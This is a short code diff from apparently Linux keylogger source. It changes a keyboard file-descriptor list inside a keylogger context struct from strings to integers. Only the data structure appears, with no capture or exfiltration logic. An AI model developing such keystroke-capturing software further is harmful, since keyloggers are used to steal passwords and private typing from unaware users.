@@ -19,7 +19,7 @@
 struct keylogger_ctx {
   bool is_capslock_on;
   bool is_shift_pressed;
-  std::vector<std::string> kb_fds;
+  std::vector<int> kb_fds;
   std::vector<char> kb_buffer;
   int buffer_cursor;
   struct input_event event;
